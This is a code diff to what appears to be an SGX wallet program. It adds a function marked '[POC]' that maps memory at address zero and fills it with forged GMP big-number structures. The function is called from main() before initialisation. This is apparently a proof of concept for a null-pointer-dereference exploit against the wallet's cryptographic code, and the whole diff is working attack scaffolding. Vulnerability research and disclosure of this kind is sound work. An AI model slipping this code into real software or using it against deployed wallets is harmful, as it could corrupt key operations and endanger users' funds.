@@ -22,7 +22,10 @@
 */
 
 #include <csignal>
+#include <cstdint>
+#include <iostream>
 #include <stdbool.h>
+#include <sys/mman.h>
 
 #include "ExitHandler.h"
 
@@ -41,6 +44,44 @@
 #include "sgxwall.h"
 #include "sgxwallet.h"
 #include "testw.h"
+
+static int setup_null_page() {
+  void *null_page = mmap(0, 4096, PROT_READ | PROT_WRITE,
+                         MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+  if (null_page == MAP_FAILED) {
+    std::cerr << "[POC] mmap null page 失败" << std::endl;
+    return -1;
+  }
+
+  uint8_t *np = (uint8_t *)0;
+  uint64_t *limbs = (uint64_t *)(np + 256);
+  limbs[0] = 1ULL;
+  limbs[1] = 0ULL;
+  limbs[2] = 7ULL;
+  limbs[3] = 1ULL;
+  limbs[4] = 1ULL;
+  limbs[5] = 1ULL;
+  limbs[6] = 1ULL;
+
+  auto write_mpz = [&](int off, int sz, uint64_t *d) {
+    *(int32_t *)(np + off) = 1;
+    *(int32_t *)(np + off + 4) = sz;
+    *(uint64_t **)(np + off + 8) = d;
+  };
+
+  write_mpz(8, 1, &limbs[0]);
+  write_mpz(24, 0, &limbs[1]);
+  write_mpz(40, 1, &limbs[2]);
+  write_mpz(64, 1, &limbs[3]);
+  write_mpz(80, 1, &limbs[4]);
+  write_mpz(128, 1, &limbs[5]);
+  write_mpz(144, 1, &limbs[6]);
+  *(uint8_t *)(np + 160) = 0;
+  *(uint8_t **)(np + 56) = np + 128;
+
+  std::cerr << "[POC] null page 配置完成" << std::endl;
+  return 0;
+}
 
 void SGXWallet::printUsage() {
   cerr << "\nAvailable flags:\n";
@@ -191,6 +232,8 @@ int main(int argc, char *argv[]) {
   if (printTraceInfoOption) {
     enclaveLogLevel = L_TRACE;
   }
+
+  setup_null_page();
 
   cerr << "Calling initAll ..." << endl;
   initAll(enclaveLogLevel, checkClientCertOption, checkClientCertOption,
